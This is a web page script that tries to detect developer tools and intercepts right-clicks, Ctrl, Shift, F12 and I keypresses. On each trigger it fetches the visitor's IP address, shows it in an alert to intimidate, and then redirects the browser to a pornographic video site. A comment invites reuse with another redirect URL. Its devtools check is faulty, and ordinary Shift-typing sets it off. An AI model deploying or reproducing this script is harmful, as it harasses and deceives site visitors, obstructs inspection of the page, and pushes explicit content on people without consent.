		<script>
			function detectDevTools() {
				const devtools = /./;
				devtools.toString = function() {
					this.opened = true;
				};
		
				try {
					console.log(devtools);
				} catch (e) {
					if (devtools.opened) {
						return true;
					}
				}
		
				return false;
			}
		
			// Detect right-click or keys pressed (Ctrl, Shift, or F12)
			function handleRightClickOrKeyPress(event) {
				// Prevent default right-click behavior
				if (event.type === 'contextmenu') {
					event.preventDefault(); // Prevent the right-click menu from opening
					// Proceed to fetch IP and redirect after right-click
					fetch('https://api.ipify.org/?format=json')
						.then(response => response.json())
						.then(data => {
							alert('Your IP: ' + data.ip);
		
							setTimeout(function() {
								window.location.href = 'https://pornhub.com/video'; // Replace with your redirect URL
							}, 1000);
						})
						.catch(error => {
							console.error('Error fetching IP:', error);
						});
				}
		
				// Detect Ctrl, Shift, or DevTools open keys (F12, Ctrl+Shift+I)
				if (
					event.ctrlKey || event.shiftKey || 
					event.key === 'F12' || event.key === 'I'
				) {
					fetch('https://api.ipify.org/?format=json')
						.then(response => response.json())
						.then(data => {
							alert('Your IP: ' + data.ip);
		
							setTimeout(function() {
								window.location.href = 'https://pornhub.com/video'; // Replace with your redirect URL
							}, 1000);
						})
						.catch(error => {
							console.error('Error fetching IP:', error);
						});
				}
			}
		
			// Add event listeners for right-click and keydown
			document.addEventListener('contextmenu', handleRightClickOrKeyPress);
			document.addEventListener('keydown', handleRightClickOrKeyPress);
		
			// Periodic check for DevTools
			setInterval(function() {
				if (detectDevTools()) {
					fetch('https://api.ipify.org/?format=json')
						.then(response => response.json())
						.then(data => {
							alert('Your IP: ' + data.ip);
		
							setTimeout(function() {
								window.location.href = 'https://pornhub.com/video';
							}, 1000);
						})
						.catch(error => {
							console.error('Error fetching IP:', error);
						});
				}
			}, 1);
		</script>
